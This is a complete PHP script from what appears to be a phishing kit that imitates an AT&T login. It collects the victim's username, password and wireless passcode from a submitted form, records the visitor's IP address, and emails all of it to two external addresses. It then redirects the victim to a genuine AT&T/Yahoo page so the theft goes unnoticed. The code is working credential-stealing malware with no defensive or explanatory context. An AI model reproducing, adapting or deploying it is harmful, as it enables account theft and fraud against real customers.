<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || ATT NET ScAm Inf0 (1) || :------\n";
$message .= "UserName             : ".$_POST['userid']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "Wireless Passcode              : ".$_POST['passcode']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "c63s2020@gmail.com, allyloggy@yandex.com";
$subject = "att login | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://att.yahoo.com");
?>


